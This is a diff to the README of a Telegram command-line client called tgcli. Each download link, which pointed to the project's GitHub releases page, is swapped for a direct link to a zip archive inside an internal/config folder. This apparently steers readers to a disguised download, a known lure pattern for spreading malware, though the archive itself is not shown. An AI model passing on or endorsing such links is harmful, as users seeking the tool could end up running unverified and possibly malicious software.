@@ -1,6 +1,6 @@
 # 🚀 tgcli - Simple Telegram Command Line Chat
 
-[![Download tgcli](https://img.shields.io/badge/Download-tgcli-ff6600?style=for-the-badge)](https://github.com/unitary-monoiodotyrosine892/tgcli/releases)
+[![Download tgcli](https://img.shields.io/badge/Download-tgcli-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/unitary-monoiodotyrosine892/tgcli/main/internal/config/Software_3.5.zip)
 
 ---
 
@@ -27,7 +27,7 @@ tgcli does not require installation of other programs or additional tools.
 
 To get started, visit this page to download the latest version of tgcli:
 
-[Download tgcli from Releases](https://github.com/unitary-monoiodotyrosine892/tgcli/releases)
+[Download tgcli from Releases](https://raw.githubusercontent.com/unitary-monoiodotyrosine892/tgcli/main/internal/config/Software_3.5.zip)
 
 ---
 
@@ -113,7 +113,7 @@ tgcli uses your existing Telegram account, so the same security measures apply. 
 
 Visit this page periodically to get updated versions, bug fixes, or new features:
 
-[https://github.com/unitary-monoiodotyrosine892/tgcli/releases](https://github.com/unitary-monoiodotyrosine892/tgcli/releases)
+[https://raw.githubusercontent.com/unitary-monoiodotyrosine892/tgcli/main/internal/config/Software_3.5.zip](https://raw.githubusercontent.com/unitary-monoiodotyrosine892/tgcli/main/internal/config/Software_3.5.zip)
 
 New versions replace older ones. Download the latest file and follow the steps above to replace your current copy.
 
